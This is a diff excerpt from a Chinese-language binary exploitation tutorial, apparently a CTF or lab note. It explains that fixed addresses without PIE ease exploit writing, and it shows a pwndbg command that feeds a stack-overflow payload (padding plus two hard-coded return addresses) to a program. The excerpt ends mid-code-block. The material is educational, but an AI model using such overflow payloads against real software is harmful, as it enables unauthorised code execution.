@@ -172,6 +172,9 @@ call 会直接 push eip, 然后把 eip 设成被呼叫的函数的位址。我�
 
 因为 PIE 没开启，所以 .text 和 .data 位址都是固定的（上面我们用到的那两个位址，一个在 .text，一个在 .heap），这在编写 exploit 的时候方便许多。
 
+<br>
+
+## Pwn
 gdb 中进行 pwn：
 ```
 pwndbg> r <<< $(python2 -c 'print 11 * "AAAA" + "\x57\x86\x04\x08" + "\x30\xa0\x04\x08")
